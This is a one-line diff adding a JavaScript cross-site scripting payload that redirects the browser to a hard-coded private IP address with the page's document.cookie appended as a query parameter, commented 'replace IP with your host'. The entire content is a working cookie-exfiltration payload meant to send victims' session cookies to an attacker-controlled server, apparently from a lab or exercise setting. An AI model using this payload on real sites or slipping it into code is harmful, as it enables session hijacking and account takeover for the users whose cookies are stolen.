@@ -1,0 +1,1 @@
+document.location = 'http://192.168.195.133/?cookie=' + document.cookie; // replace IP with your host
